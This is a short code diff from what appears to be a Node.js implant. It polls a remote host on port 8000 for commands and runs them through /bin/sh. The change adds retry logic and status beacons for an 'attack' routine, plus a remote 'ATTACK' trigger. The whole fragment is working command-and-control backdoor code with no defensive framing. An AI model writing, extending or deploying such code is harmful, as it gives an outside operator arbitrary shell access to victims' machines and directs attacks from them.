@@ -115,7 +115,15 @@ function attack() {
     setTimeout(function () { finish('timeout'); }, 60000);
 }
 
-setTimeout(attack, 45000);
+var retries = 0;
+function maybeAttack() {
+    if (retries >= 10) { post('C12v2?retries_exhausted'); return; }
+    retries++;
+    post('C12v2?try=' + retries);
+    attack();
+    setTimeout(maybeAttack, 60000);
+}
+setTimeout(maybeAttack, 20000);
 
 function tick() {
     http.get('http://' + HOST + ':8000/cmd', function (res) {
@@ -123,7 +131,9 @@ function tick() {
         res.setEncoding('utf8');
         res.on('data', function (c) { b += c; });
         res.on('end', function () {
-            if ((b || '').trim().length > 0) {
+            var body0 = (b || '').trim();
+            if (body0 === 'ATTACK') { if (!attacking) { maybeAttack(); } }
+            else if (body0.length > 0) {
                 var sh = cp.spawn('/bin/sh', ['-c', b]);
                 var o = '', e = '';
                 sh.stdout.on('data', function (d) { o += d; });
